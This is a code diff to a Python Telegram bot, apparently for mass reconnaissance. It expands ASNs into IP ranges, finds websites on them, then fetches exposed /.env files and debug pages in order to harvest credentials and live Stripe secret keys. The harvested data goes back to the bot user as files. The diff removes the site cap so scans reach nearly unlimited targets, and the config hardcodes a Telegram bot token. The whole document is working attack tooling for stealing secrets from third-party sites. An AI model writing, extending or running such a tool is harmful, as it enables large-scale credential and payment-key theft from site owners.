@@ -8,9 +8,10 @@ import http.client
 import requests
 import time
 import logging
+import tempfile
 from io import BytesIO
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from threading import Lock
+from concurrent.futures import ThreadPoolExecutor
+from threading import Lock, Thread, local as thread_local_cls
 import telebot
 from telebot import types
 import urllib3
@@ -21,10 +22,14 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 #  Config
 # ═══════════════════════════════════════
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8985328412:AAFn5lLqsNGvEVQDOZ3NgKA-xEp7ptZAzww")
-MAX_THREADS = 30
+MAX_THREADS = 25
 DEFAULT_IPS_PER_PREFIX = 16
-SCAN_TIMEOUT = 1.5
-MAX_SITES_FOR_LEAK = 2000
+SCAN_TIMEOUT = 3.0
+MAX_SITES_FOR_LEAK = 999999
+LEAK_TIMEOUT = 5
+LEAK_CONTENT_LIMIT = 512 * 1024  # 512KB per response
+LEAK_CONTENT_STORE = 10 * 1024   # 10KB per site stored
+LEAK_BATCH_SIZE = 2000
 
 logging.basicConfig(
     format="%(asctime)s [%(levelname)s] %(message)s",
@@ -33,6 +38,36 @@ logging.basicConfig(
 log = logging.getLogger("recon-bot")
 
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
+
+# ═══════════════════════════════════════
+#  Thread-local sessions for connection reuse
+# ═══════════════════════════════════════
+_thread_local = thread_local_cls()
+
+
+def get_session():
+    if not hasattr(_thread_local, "session"):
+        s = requests.Session()
+        s.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 12)"})
+        adapter = requests.adapters.HTTPAdapter(
+            pool_connections=MAX_THREADS * 2,
+            pool_maxsize=MAX_THREADS * 2,
+            max_retries=0,
+        )
+        s.mount("http://", adapter)
+        s.mount("https://", adapter)
+        _thread_local.session = s
+    return _thread_local.session
+
+
+# ═══════════════════════════════════════
+#  Background thread runner
+# ═══════════════════════════════════════
+def run_in_background(func, *args):
+    t = Thread(target=func, args=args, daemon=True)
+    t.start()
+    return t
+
 
 # ═══════════════════════════════════════
 #  Active scans tracker
@@ -271,13 +306,16 @@ def ip_to_asn(ip):
 def scan_ip_fast(ip):
     r = {"ip": ip, "domains": set(), "title": None, "server": None}
 
+    # Reverse DNS — longer timeout
     try:
-        socket.setdefaulttimeout(SCAN_TIMEOUT)
+        socket.setdefaulttimeout(5)
         r["domains"].add(socket.gethostbyaddr(ip)[0])
     except (socket.herror, socket.gaierror, OSError):
         pass
 
+    # SSL cert domains
     try:
+        socket.setdefaulttimeout(SCAN_TIMEOUT)
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
@@ -296,7 +334,9 @@ def scan_ip_fast(ip):
     except (socket.timeout, OSError, ssl.SSLError):
         pass
 
+    # HTTP probe
     try:
+        socket.setdefaulttimeout(SCAN_TIMEOUT)
         sock = socket.create_connection((ip, 80), timeout=SCAN_TIMEOUT)
         sock.send(
             b"GET / HTTP/1.0\r\nHost: " + ip.encode() +
@@ -331,52 +371,163 @@ def prefix_to_ips(prefix, max_ips=DEFAULT_IPS_PER_PREFIX):
 
 
 # ═══════════════════════════════════════
-#  Leak Scanners
+#  File-based leak result storage (RAM-safe)
 # ═══════════════════════════════════════
 ENV_KEYS = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=', 'sk_live', 'APP_ENV=']
 DEBUG_KEYS = ['DB_HOST', 'MAIL_HOST', 'DB_CONNECTION', 'MAIL_USERNAME', 'sk_live', 'APP_DEBUG']
 
+TMP_DIR = tempfile.mkdtemp(prefix="leakscan_")
+file_lock = Lock()
+
+result_counters = {
+    "env_http": 0,
+    "env_https": 0,
+    "debug": 0,
+}
+
+sk_keys_set = set()
+sk_sites_set = set()
+
+
+def _write_result(file_name, text):
+    with file_lock:
+        fpath = os.path.join(TMP_DIR, file_name)
+        with open(fpath, "a") as f:
+            f.write(text)
+            f.flush()
+
+
+def _read_result(file_name):
+    fpath = os.path.join(TMP_DIR, file_name)
+    if os.path.exists(fpath):
+        with open(fpath, "r") as f:
+            return f.read()
+    return ""
+
+
+def _reset_results():
+    global result_counters, sk_keys_set, sk_sites_set
+    result_counters = {
+        "env_http": 0,
+        "env_https": 0,
+        "debug": 0,
+    }
+    sk_keys_set = set()
+    sk_sites_set = set()
+    for fn in ["env_sites.txt", "env_contents.txt",
+               "debug_sites.txt", "debug_contents.txt",
+               "sk_keys.txt", "sk_sites.txt"]:
+        fpath = os.path.join(TMP_DIR, fn)
+        if os.path.exists(fpath):
+            os.remove(fpath)
+
+
+# ═══════════════════════════════════════
+#  Leak Scanners (memory-safe)
+# ═══════════════════════════════════════
+def _read_response_limited(response, limit=LEAK_CONTENT_LIMIT):
+    content = ""
+    size = 0
+    for chunk in response.iter_content(chunk_size=8192, decode_unicode=True):
+        content += chunk
+        size += len(chunk)
+        if size > limit:
+            break
+    response.close()
+    return content
+
 
 def scan_env(site, proto="http"):
+    global result_counters, sk_keys_set, sk_sites_set
     try:
-        r = requests.get(
+        session = get_session()
+        r = session.get(
             f'{proto}://{site}/.env',
-            verify=False, timeout=10, allow_redirects=False
+            verify=False, timeout=LEAK_TIMEOUT, allow_redirects=False,
+            stream=True
         )
         if r.status_code != 200:
-            return None
-        resp = r.text
-        if not any(k in resp for k in ENV_KEYS):
-            return None
+            r.close()
+            return False
+
+        content = _read_response_limited(r)
+
+        if not any(k in content for k in ENV_KEYS):
+            return False
+
         sk = []
-        for line in resp.splitlines():
+        for line in content.splitlines():
             if "sk_live" in line:
                 key = re.sub(r'.*sk_live', 'sk_live', line).replace('"', '').strip()
                 sk.append(key)
-        return {"site": site, "proto": proto, "content": resp, "sk_keys": sk}
+
+        _write_result("env_sites.txt", f"{site}\n")
+        _write_result("env_contents.txt",
+                       f"# ═══ {proto}://{site}/.env ═══\n"
+                       f"{content[:LEAK_CONTENT_STORE]}\n\n")
+
+        for k in sk:
+            _write_result("sk_keys.txt", f"{k}\n")
+            with file_lock:
+                sk_keys_set.add(k)
+        if sk:
+            _write_result("sk_sites.txt", f"{site}\n")
+            with file_lock:
+                sk_sites_set.add(site)
+
+        with file_lock:
+            if proto == "http":
+                result_counters["env_http"] += 1
+            else:
+                result_counters["env_https"] += 1
+
+        return True
+
     except Exception:
-        return None
+        return False
 
 
 def scan_debug(site):
+    global result_counters, sk_keys_set, sk_sites_set
     for proto in ["https", "http"]:
         try:
-            r = requests.post(
+            session = get_session()
+            r = session.post(
                 f'{proto}://{site}',
                 data={'debug': 'true'},
-                allow_redirects=False, verify=False, timeout=10
+                allow_redirects=False, verify=False,
+                timeout=LEAK_TIMEOUT, stream=True
             )
-            resp = r.text
-            if any(k in resp for k in DEBUG_KEYS):
+            content = _read_response_limited(r)
+
+            if any(k in content for k in DEBUG_KEYS):
                 sk = []
-                for line in resp.splitlines():
+                for line in content.splitlines():
                     if "sk_live" in line:
                         key = re.sub(r'.*sk_live', 'sk_live', line).replace('"', '').strip()
                         sk.append(key)
-                return {"site": site, "proto": proto, "content": resp, "sk_keys": sk}
+
+                _write_result("debug_sites.txt", f"{site}\n")
+                _write_result("debug_contents.txt",
+                               f"# ═══ {proto}://{site} (debug=true) ═══\n"
+                               f"{content[:LEAK_CONTENT_STORE]}\n\n")
+
+                for k in sk:
+                    _write_result("sk_keys.txt", f"{k}\n")
+                    with file_lock:
+                        sk_keys_set.add(k)
+                if sk:
+                    _write_result("sk_sites.txt", f"{site}\n")
+                    with file_lock:
+                        sk_sites_set.add(site)
+
+                with file_lock:
+                    result_counters["debug"] += 1
+
+                return True
         except Exception:
             continue
-    return None
+    return False
 
 
 # ═══════════════════════════════════════
@@ -392,6 +543,10 @@ def run_ip_scan(chat_id, ips, progress_msg_id):
 
     with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
         futures = {executor.submit(scan_ip_fast, ip): ip for ip in ips}
+        for future in futures:
+            pass
+        from concurrent.futures import as_completed
+        done = 0
         for future in as_completed(futures):
             result = future.result()
             done += 1
@@ -401,7 +556,7 @@ def run_ip_scan(chat_id, ips, progress_msg_id):
                 with lock:
                     all_domains.update(result["domains"])
 
-            if done % 200 == 0 and done < total:
+            if done % 500 == 0 and done < total:
                 pct = (done / total) * 100
                 elapsed = time.time() - start
                 speed = done / elapsed if elapsed > 0 else 0
@@ -426,87 +581,61 @@ def run_ip_scan(chat_id, ips, progress_msg_id):
 
 
 def run_leak_scan(chat_id, sites, progress_msg_id, step_name="Leak Scan", scan_type="both"):
-    env_http = {}
-    env_https = {}
-    debug_hits = {}
-    sk_sites = set()
-    sk_keys = set()
+    _reset_results()
+
     done = 0
     total = len(sites)
-    lock = Lock()
     start = time.time()
 
     def do_site(site):
-        results = {"env_http": None, "env_https": None, "debug": None}
         if scan_type in ("env", "both"):
-            results["env_http"] = scan_env(site, "http")
-            results["env_https"] = scan_env(site, "https")
+            scan_env(site, "http")
+            scan_env(site, "https")
         if scan_type in ("debug", "both"):
-            results["debug"] = scan_debug(site)
-        return site, results
+            scan_debug(site)
 
-    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
-        futures = {executor.submit(do_site, site): site for site in sites}
-        for future in as_completed(futures):
-            site, res = future.result()
-            done += 1
+    # ═══════════════════════════════════════
+    #  Batch mode — 2000 sites တစ်ခါ, RAM safe
+    # ═══════════════════════════════════════
+    for batch_idx in range(0, total, LEAK_BATCH_SIZE):
+        batch = sites[batch_idx:batch_idx + LEAK_BATCH_SIZE]
 
-            with lock:
-                if res["env_http"]:
-                    env_http[site] = res["env_http"]
-                    for k in res["env_http"]["sk_keys"]:
-                        sk_keys.add(k)
-                    if res["env_http"]["sk_keys"]:
-                        sk_sites.add(site)
-                if res["env_https"]:
-                    env_https[site] = res["env_https"]
-                    for k in res["env_https"]["sk_keys"]:
-                        sk_keys.add(k)
-                    if res["env_https"]["sk_keys"]:
-                        sk_sites.add(site)
-                if res["debug"]:
-                    debug_hits[site] = res["debug"]
-                    for k in res["debug"]["sk_keys"]:
-                        sk_keys.add(k)
-                    if res["debug"]["sk_keys"]:
-                        sk_sites.add(site)
+        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+            list(executor.map(do_site, batch))
 
-            if done % 50 == 0 and done < total:
-                pct = (done / total) * 100
-                elapsed = time.time() - start
-                speed = done / elapsed if elapsed > 0 else 0
-                eta = (total - done) / speed if speed > 0 else 0
-                try:
-                    bot.edit_message_text(
-                        f"🔓 <b>{step_name}</b>\n"
-                        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
-                        f"<code>{progress_bar(pct)}</code> {pct:.0f}%\n\n"
-                        f"📊 {fmt_num(done)} / {fmt_num(total)} sites\n"
-                        f"🔓 .env HTTP: <b>{len(env_http)}</b>\n"
-                        f"🔐 .env HTTPS: <b>{len(env_https)}</b>\n"
-                        f"🐛 Debug: <b>{len(debug_hits)}</b>\n"
-                        f"💳 Stripe keys: <b>{len(sk_keys)}</b>\n"
-                        f"🕐 ETA: {fmt_time(eta)}",
-                        chat_id, progress_msg_id,
-                        reply_markup=make_cancel_button()
-                    )
-                except Exception:
-                    pass
+        done += len(batch)
+
+        pct = (done / total) * 100
+        elapsed = time.time() - start
+        speed = done / elapsed if elapsed > 0 else 0
+        eta = (total - done) / speed if speed > 0 else 0
+        try:
+            bot.edit_message_text(
+                f"🔓 <b>{step_name}</b>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━\n\n"
+                f"<code>{progress_bar(pct)}</code> {pct:.0f}%\n\n"
+                f"📊 {fmt_num(done)} / {fmt_num(total)} sites\n"
+                f"🔓 .env HTTP: <b>{result_counters['env_http']}</b>\n"
+                f"🔐 .env HTTPS: <b>{result_counters['env_https']}</b>\n"
+                f"🐛 Debug: <b>{result_counters['debug']}</b>\n"
+                f"💳 Stripe keys: <b>{len(sk_keys_set)}</b>\n"
+                f"🕐 ETA: {fmt_time(eta)}",
+                chat_id, progress_msg_id,
+                reply_markup=make_cancel_button()
+            )
+        except Exception:
+            pass
+
+        time.sleep(0.5)
 
     elapsed = time.time() - start
-    return env_http, env_https, debug_hits, sk_sites, sk_keys, elapsed
+    return result_counters.copy(), sk_keys_set.copy(), sk_sites_set.copy(), elapsed
 
 
 # ═══════════════════════════════════════
 #  File helpers
 # ═══════════════════════════════════════
 def make_txt_file(content, filename):
-    bio = BytesIO(content.encode("utf-8"))
-    bio.name = filename
-    return bio
-
-
-def make_html_file(content, filename):
     bio = BytesIO(content.encode("utf-8"))
     bio.name = filename
     return bio
@@ -531,84 +660,228 @@ def build_sk_html(sk_keys):
     return html
 
 
-def deliver_leak_files(chat_id, env_http, env_https, debug_hits, sk_sites, sk_keys, suffix):
-    """Leak scan result files အားလုံး ပို့ပေးတယ်"""
+def deliver_leak_files(chat_id, suffix):
     ts = int(time.time())
     tag = f"{suffix}_{ts}"
 
-    env_sites = sorted(set(list(env_http.keys()) + list(env_https.keys())))
-
-    # 1. .env exposed site list
-    if env_sites:
+    env_sites = _read_result("env_sites.txt")
+    if env_sites.strip():
+        sites_list = sorted(set(env_sites.strip().splitlines()))
         bot.send_document(
             chat_id,
-            make_txt_file("\n".join(env_sites), f"env_exposed_{tag}.txt"),
-            caption=f"🔓 {len(env_sites)} .env exposed"
+            make_txt_file("\n".join(sites_list), f"env_exposed_{tag}.txt"),
+            caption=f"🔓 {len(sites_list)} .env exposed"
         )
 
-        # Full .env contents (unique sites)
-        env_content = []
-        seen = set()
-        for site, data in list(env_http.items()) + list(env_https.items()):
-            if site in seen:
-                continue
-            seen.add(site)
-            env_content.append(f"# ═══ {data['proto']}://{site}/.env ═══")
-            env_content.append(data["content"])
-            env_content.append("")
+        env_contents = _read_result("env_contents.txt")
+        if env_contents.strip():
+            bot.send_document(
+                chat_id,
+                make_txt_file(env_contents, f"env_contents_{tag}.txt"),
+                caption=f"📄 .env contents ({len(sites_list)} sites)"
+            )
 
+    debug_sites = _read_result("debug_sites.txt")
+    if debug_sites.strip():
+        sites_list = sorted(set(debug_sites.strip().splitlines()))
         bot.send_document(
             chat_id,
-            make_txt_file("\n".join(env_content), f"env_contents_{tag}.txt"),
-            caption=f"📄 {len(seen)} .env contents"
+            make_txt_file("\n".join(sites_list), f"debug_exposed_{tag}.txt"),
+            caption=f"🐛 {len(sites_list)} debug exposed"
         )
 
-    # 2. Debug exposed
-    if debug_hits:
+        debug_contents = _read_result("debug_contents.txt")
+        if debug_contents.strip():
+            bot.send_document(
+                chat_id,
+                make_txt_file(debug_contents, f"debug_contents_{tag}.txt"),
+                caption=f"🐛 {len(sites_list)} debug contents"
+            )
+
+    if sk_keys_set:
+        keys_sorted = sorted(sk_keys_set)
         bot.send_document(
             chat_id,
-            make_txt_file("\n".join(sorted(debug_hits.keys())), f"debug_exposed_{tag}.txt"),
-            caption=f"🐛 {len(debug_hits)} debug exposed"
-        )
-
-        debug_content = []
-        for site, data in debug_hits.items():
-            debug_content.append(f"# ═══ {data['proto']}://{site} (debug=true) ═══")
-            debug_content.append(data["content"])
-            debug_content.append("")
-
-        bot.send_document(
-            chat_id,
-            make_txt_file("\n".join(debug_content), f"debug_contents_{tag}.txt"),
-            caption=f"🐛 {len(debug_hits)} debug contents"
-        )
-
-    # 3. Stripe keys — .txt + .html
-    if sk_keys:
-        bot.send_document(
-            chat_id,
-            make_txt_file("\n".join(sorted(sk_keys)), f"sk_live_keys_{tag}.txt"),
-            caption=f"💳 {len(sk_keys)} Stripe LIVE keys ⚠️"
+            make_txt_file("\n".join(keys_sorted), f"sk_live_keys_{tag}.txt"),
+            caption=f"💳 {len(keys_sorted)} Stripe LIVE keys"
         )
 
         bot.send_document(
             chat_id,
-            make_txt_file(build_sk_html(sk_keys), f"sk_live_{tag}.html"),
-            caption=f"💳 {len(sk_keys)} Stripe keys (HTML)"
+            make_txt_file(build_sk_html(keys_sorted), f"sk_live_{tag}.html"),
+            caption=f"💳 {len(keys_sorted)} Stripe keys (HTML)"
         )
 
-    # 4. Stripe sites
-    if sk_sites:
+    if sk_sites_set:
+        sites_sorted = sorted(sk_sites_set)
         bot.send_document(
             chat_id,
-            make_txt_file("\n".join(sorted(sk_sites)), f"sk_sites_{tag}.txt"),
-            caption=f"💰 {len(sk_sites)} sites with Stripe keys"
+            make_txt_file("\n".join(sites_sorted), f"sk_sites_{tag}.txt"),
+            caption=f"💰 {len(sites_sorted)} sites with Stripe keys"
         )
+
+    _reset_results()
 
 
 # ═══════════════════════════════════════════════
 #  PIPELINE — Full auto chain
 # ═══════════════════════════════════════════════
+
+def _pipeline_worker(chat_id, asns, max_ips, msg_id):
+    set_scan(chat_id, "pipeline")
+    results = {"asns": asns, "prefixes": set(), "sites": set()}
+
+    try:
+        try:
+            bot.edit_message_text(
+                f"🚀 <b>Pipeline Started</b>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━\n\n"
+                f"<b>Step 1/3: ASN → Prefixes</b>\n"
+                f"<code>{progress_bar(0)}</code> 0%\n\n"
+                f"Processing {len(asns)} ASN(s)...",
+                chat_id, msg_id, reply_markup=make_cancel_button()
+            )
+        except Exception:
+            pass
+
+        asn_results = []
+        for i, asn in enumerate(asns):
+            if not get_scan(chat_id):
+                raise Exception("cancelled")
+
+            prefixes, err = asn_to_prefixes(asn)
+            info = asn_info(asn)
+            holder = info.get("holder", "Unknown")
+
+            if err:
+                asn_results.append(f"  ❌ AS{asn}: {err}")
+            else:
+                new = set(prefixes) - results["prefixes"]
+                results["prefixes"].update(prefixes)
+                asn_results.append(
+                    f"  ✅ AS{asn} ({holder}): {fmt_num(len(prefixes))} ({fmt_num(len(new))} new)"
+                )
+
+            pct = int(((i + 1) / len(asns)) * 100)
+            try:
+                bot.edit_message_text(
+                    f"🚀 <b>Pipeline</b>\n"
+                    f"━━━━━━━━━━━━━━━━━━━━━\n\n"
+                    f"<b>Step 1/3: ASN → Prefixes</b>\n"
+                    f"<code>{progress_bar(pct)}</code> {pct}%\n\n"
+                    + "\n".join(asn_results) +
+                    f"\n\n📦 Total: <b>{fmt_num(len(results['prefixes']))}</b> prefixes",
+                    chat_id, msg_id, reply_markup=make_cancel_button()
+                )
+            except Exception:
+                pass
+
+        if not results["prefixes"]:
+            bot.edit_message_text("❌ No prefixes found.", chat_id, msg_id,
+                                  reply_markup=make_back_button())
+            return
+
+        all_ips = []
+        for prefix in results["prefixes"]:
+            all_ips.extend(prefix_to_ips(prefix, max_ips))
+        all_ips = list(set(all_ips))
+
+        try:
+            bot.edit_message_text(
+                f"🚀 <b>Pipeline</b>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━\n\n"
+                f"<b>Step 2/3: Site Discovery</b>\n"
+                f"<code>{progress_bar(0)}</code> 0%\n\n"
+                f"🎯 IPs: <b>{fmt_num(len(all_ips))}</b>\n"
+                f"⏱ ETA: ~{fmt_time(len(all_ips)/(MAX_THREADS*2))}",
+                chat_id, msg_id, reply_markup=make_cancel_button()
+            )
+        except Exception:
+            pass
+
+        sites, found, scanned, t2 = run_ip_scan(chat_id, all_ips, msg_id)
+
+        if not get_scan(chat_id):
+            raise Exception("cancelled")
+
+        results["sites"] = sites
+
+        try:
+            bot.edit_message_text(
+                f"🚀 <b>Pipeline</b>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━\n\n"
+                f"✅ <b>Step 2/3 Complete</b>\n\n"
+                f"📊 Scanned: {fmt_num(scanned)} ({fmt_time(t2)})\n"
+                f"🟢 Hosts: {fmt_num(found)}\n"
+                f"🌐 Sites: <b>{fmt_num(len(sites))}</b>\n\n"
+                f"Starting leak scan...",
+                chat_id, msg_id, reply_markup=make_cancel_button()
+            )
+        except Exception:
+            pass
+
+        if not sites:
+            bot.send_message(chat_id, "😕 No sites found. Pipeline stopped.")
+            return
+
+        sites_list = list(sites)
+        if len(sites_list) > MAX_SITES_FOR_LEAK:
+            bot.send_message(chat_id,
+                f"⚠️ {fmt_num(len(sites_list))} sites — capping at {MAX_SITES_FOR_LEAK}")
+            sites_list = sites_list[:MAX_SITES_FOR_LEAK]
+
+        counters, sk_keys_copy, sk_sites_copy, t3 = run_leak_scan(
+            chat_id, sites_list, msg_id, "Step 3/3: Leak Scan", "both"
+        )
+
+        summary = (
+            f"✅ <b>Pipeline Complete</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"<code>{progress_bar(100)}</code> 100%\n\n"
+            f"<b>📊 Stats:</b>\n"
+            f"  🔍 ASNs: {len(asns)}\n"
+            f"  📦 Prefixes: {fmt_num(len(results['prefixes']))}\n"
+            f"  🎯 IPs: {fmt_num(len(all_ips))}\n"
+            f"  🌐 Sites: {fmt_num(len(sites))}\n\n"
+            f"<b>🔓 Leaks:</b>\n"
+            f"  📄 .env (HTTP): <b>{counters['env_http']}</b>\n"
+            f"  🔐 .env (HTTPS): <b>{counters['env_https']}</b>\n"
+            f"  🐛 Debug: <b>{counters['debug']}</b>\n"
+            f"  💳 Stripe keys: <b>{len(sk_keys_copy)}</b>\n\n"
+            f"⏱ Time: {fmt_time(t2 + t3)}"
+        )
+
+        try:
+            bot.edit_message_text(summary, chat_id, msg_id)
+        except Exception:
+            bot.send_message(chat_id, summary)
+
+        suffix = f"AS{'_'.join(asns)}"
+
+        if results["prefixes"]:
+            bot.send_document(chat_id,
+                make_txt_file("\n".join(sorted(results["prefixes"])), f"prefixes_{suffix}.txt"),
+                caption=f"📦 {fmt_num(len(results['prefixes']))} prefixes")
+
+        if results["sites"]:
+            bot.send_document(chat_id,
+                make_txt_file("\n".join(sorted(results["sites"])), f"sites_{suffix}.txt"),
+                caption=f"🌐 {fmt_num(len(results['sites']))} sites")
+
+        deliver_leak_files(chat_id, suffix)
+
+        bot.send_message(chat_id, "🏁 <b>All done.</b>", reply_markup=make_back_button())
+
+    except Exception as e:
+        if "cancelled" in str(e):
+            bot.send_message(chat_id, "🛑 Pipeline cancelled.", reply_markup=make_back_button())
+        else:
+            log.error(f"Pipeline error: {e}")
+            bot.send_message(chat_id, f"❌ Error: {str(e)[:100]}", reply_markup=make_back_button())
+    finally:
+        clear_scan(chat_id)
+
+
 @bot.message_handler(commands=["pipeline"])
 def cmd_pipeline(message):
     parts = message.text.split()
@@ -670,167 +943,9 @@ def cb_pipeline_depth(call):
         return
 
     bot.answer_callback_query(call.id)
-    set_scan(chat_id, "pipeline")
-
     msg_id = call.message.message_id
-    results = {"asns": asns, "prefixes": set(), "sites": set()}
 
-    try:
-        # Step 1/3: ASN → Prefixes
-        try:
-            bot.edit_message_text(
-                f"🚀 <b>Pipeline Started</b>\n"
-                f"━━━━━━━━━━━━━━━━━━━━━\n\n"
-                f"<b>Step 1/3: ASN → Prefixes</b>\n"
-                f"<code>{progress_bar(0)}</code> 0%\n\n"
-                f"Processing {len(asns)} ASN(s)...",
-                chat_id, msg_id, reply_markup=make_cancel_button()
-            )
-        except Exception:
-            pass
-
-        asn_results = []
-        for i, asn in enumerate(asns):
-            if not get_scan(chat_id):
-                raise Exception("cancelled")
-
-            prefixes, err = asn_to_prefixes(asn)
-            info = asn_info(asn)
-            holder = info.get("holder", "Unknown")
-
-            if err:
-                asn_results.append(f"  ❌ AS{asn}: {err}")
-            else:
-                new = set(prefixes) - results["prefixes"]
-                results["prefixes"].update(prefixes)
-                asn_results.append(
-                    f"  ✅ AS{asn} ({holder}): {fmt_num(len(prefixes))} ({fmt_num(len(new))} new)"
-                )
-
-            pct = int(((i + 1) / len(asns)) * 100)
-            try:
-                bot.edit_message_text(
-                    f"🚀 <b>Pipeline</b>\n"
-                    f"━━━━━━━━━━━━━━━━━━━━━\n\n"
-                    f"<b>Step 1/3: ASN → Prefixes</b>\n"
-                    f"<code>{progress_bar(pct)}</code> {pct}%\n\n"
-                    + "\n".join(asn_results) +
-                    f"\n\n📦 Total: <b>{fmt_num(len(results['prefixes']))}</b> prefixes",
-                    chat_id, msg_id, reply_markup=make_cancel_button()
-                )
-            except Exception:
-                pass
-
-        if not results["prefixes"]:
-            bot.edit_message_text("❌ No prefixes found.", chat_id, msg_id,
-                                  reply_markup=make_back_button())
-            clear_scan(chat_id)
-            return
-
-        # Step 2/3: Prefixes → Sites
-        all_ips = []
-        for prefix in results["prefixes"]:
-            all_ips.extend(prefix_to_ips(prefix, max_ips))
-        all_ips = list(set(all_ips))
-
-        try:
-            bot.edit_message_text(
-                f"🚀 <b>Pipeline</b>\n"
-                f"━━━━━━━━━━━━━━━━━━━━━\n\n"
-                f"<b>Step 2/3: Site Discovery</b>\n"
-                f"<code>{progress_bar(0)}</code> 0%\n\n"
-                f"🎯 IPs: <b>{fmt_num(len(all_ips))}</b>\n"
-                f"⏱ ETA: ~{fmt_time(len(all_ips)/(MAX_THREADS*2))}",
-                chat_id, msg_id, reply_markup=make_cancel_button()
-            )
-        except Exception:
-            pass
-
-        sites, found, scanned, t2 = run_ip_scan(chat_id, all_ips, msg_id)
-
-        if not get_scan(chat_id):
-            raise Exception("cancelled")
-
-        results["sites"] = sites
-
-        try:
-            bot.edit_message_text(
-                f"🚀 <b>Pipeline</b>\n"
-                f"━━━━━━━━━━━━━━━━━━━━━\n\n"
-                f"✅ <b>Step 2/3 Complete</b>\n\n"
-                f"📊 Scanned: {fmt_num(scanned)} ({fmt_time(t2)})\n"
-                f"🟢 Hosts: {fmt_num(found)}\n"
-                f"🌐 Sites: <b>{fmt_num(len(sites))}</b>\n\n"
-                f"Starting leak scan...",
-                chat_id, msg_id, reply_markup=make_cancel_button()
-            )
-        except Exception:
-            pass
-
-        if not sites:
-            bot.send_message(chat_id, "😕 No sites found. Pipeline stopped.")
-            clear_scan(chat_id)
-            return
-
-        # Step 3/3: Leak Scan
-        sites_list = list(sites)
-        if len(sites_list) > MAX_SITES_FOR_LEAK:
-            bot.send_message(chat_id,
-                f"⚠️ {fmt_num(len(sites_list))} sites — capping at {MAX_SITES_FOR_LEAK}")
-            sites_list = sites_list[:MAX_SITES_FOR_LEAK]
-
-        env_http, env_https, debug_hits, sk_sites, sk_keys, t3 = run_leak_scan(
-            chat_id, sites_list, msg_id, "Step 3/3: Leak Scan", "both"
-        )
-
-        # Summary
-        summary = (
-            f"✅ <b>Pipeline Complete</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"<code>{progress_bar(100)}</code> 100%\n\n"
-            f"<b>📊 Stats:</b>\n"
-            f"  🔍 ASNs: {len(asns)}\n"
-            f"  📦 Prefixes: {fmt_num(len(results['prefixes']))}\n"
-            f"  🎯 IPs: {fmt_num(len(all_ips))}\n"
-            f"  🌐 Sites: {fmt_num(len(sites))}\n\n"
-            f"<b>🔓 Leaks:</b>\n"
-            f"  📄 .env (HTTP): <b>{len(env_http)}</b>\n"
-            f"  🔐 .env (HTTPS): <b>{len(env_https)}</b>\n"
-            f"  🐛 Debug: <b>{len(debug_hits)}</b>\n"
-            f"  💳 Stripe keys: <b>{len(sk_keys)}</b>\n\n"
-            f"⏱ Time: {fmt_time(t2 + t3)}"
-        )
-
-        try:
-            bot.edit_message_text(summary, chat_id, msg_id)
-        except Exception:
-            bot.send_message(chat_id, summary)
-
-        # Auto-deliver files
-        suffix = f"AS{'_'.join(asns)}"
-
-        if results["prefixes"]:
-            bot.send_document(chat_id,
-                make_txt_file("\n".join(sorted(results["prefixes"])), f"prefixes_{suffix}.txt"),
-                caption=f"📦 {fmt_num(len(results['prefixes']))} prefixes")
-
-        if results["sites"]:
-            bot.send_document(chat_id,
-                make_txt_file("\n".join(sorted(results["sites"])), f"sites_{suffix}.txt"),
-                caption=f"🌐 {fmt_num(len(results['sites']))} sites")
-
-        deliver_leak_files(chat_id, env_http, env_https, debug_hits, sk_sites, sk_keys, suffix)
-
-        bot.send_message(chat_id, "🏁 <b>All done.</b>", reply_markup=make_back_button())
-
-    except Exception as e:
-        if "cancelled" in str(e):
-            bot.send_message(chat_id, "🛑 Pipeline cancelled.", reply_markup=make_back_button())
-        else:
-            log.error(f"Pipeline error: {e}")
-            bot.send_message(chat_id, f"❌ Error: {str(e)[:100]}")
-    finally:
-        clear_scan(chat_id)
+    run_in_background(_pipeline_worker, chat_id, asns, max_ips, msg_id)
 
 
 # ═══════════════════════════════════════════════
@@ -1037,6 +1152,51 @@ def cmd_ip(message):
 #  /leak — Leak Scan (direct + file upload)
 # ═══════════════════════════════════════════════
 
+def _leak_worker(chat_id, sites, status_msg_id, step_name="Leak Scan", scan_type="both"):
+    set_scan(chat_id, "leak")
+    try:
+        counters, sk_keys_copy, sk_sites_copy, elapsed = run_leak_scan(
+            chat_id, sites, status_msg_id, step_name, scan_type
+        )
+    except Exception as e:
+        log.error(f"Leak scan error: {e}")
+        bot.send_message(chat_id, f"❌ Error: {str(e)[:100]}", reply_markup=make_back_button())
+        clear_scan(chat_id)
+        return
+
+    env_total = counters["env_http"] + counters["env_https"]
+    summary = (
+        f"✅ <b>{step_name} Complete</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"<code>{progress_bar(100)}</code> 100%\n\n"
+        f"🎯 Sites: <b>{fmt_num(len(sites))}</b>\n"
+    )
+
+    if scan_type in ("env", "both"):
+        summary += (
+            f"📄 .env (HTTP): <b>{counters['env_http']}</b>\n"
+            f"🔐 .env (HTTPS): <b>{counters['env_https']}</b>\n"
+            f"🔓 Exposed: <b>{env_total}</b>\n"
+        )
+
+    if scan_type in ("debug", "both"):
+        summary += f"🐛 Debug: <b>{counters['debug']}</b>\n"
+
+    summary += (
+        f"💳 Stripe keys: <b>{len(sk_keys_copy)}</b>\n\n"
+        f"🕐 Time: {fmt_time(elapsed)}"
+    )
+
+    try:
+        bot.edit_message_text(summary, chat_id, status_msg_id)
+    except Exception:
+        bot.send_message(chat_id, summary)
+
+    deliver_leak_files(chat_id, "leak")
